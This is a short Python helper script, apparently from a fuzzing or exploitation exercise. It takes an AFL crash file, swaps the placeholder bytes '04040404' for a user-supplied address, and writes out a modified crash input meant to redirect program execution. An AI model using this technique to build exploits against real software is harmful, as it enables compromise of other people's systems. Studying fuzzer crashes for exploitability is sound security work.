import binascii
import sys

if __name__ == "__main__":
    try:
        address = sys.argv[1]
        assert len(address) == 8
    except:
        print("You must provide an address to inject in hexa and of 8 bytes. Ex: '48151623'")
        exit(0)
    # Magic transformation
    formatted_address = address[-4:-2] + address[-2:] + address[0:4]
    filename = './AFL_OUTPUT/fuzzer01/crashes/id:000001,sig:11,src:000007+000052,op:splice,rep:32'
    with open(filename, 'rb') as f:
        content = f.read()
    hexcontent = binascii.hexlify(content).decode("utf-8")
    new_content = binascii.unhexlify(hexcontent.replace("04040404", formatted_address))
    with open("new_crash", 'wb') as f:
        f.write(new_content)
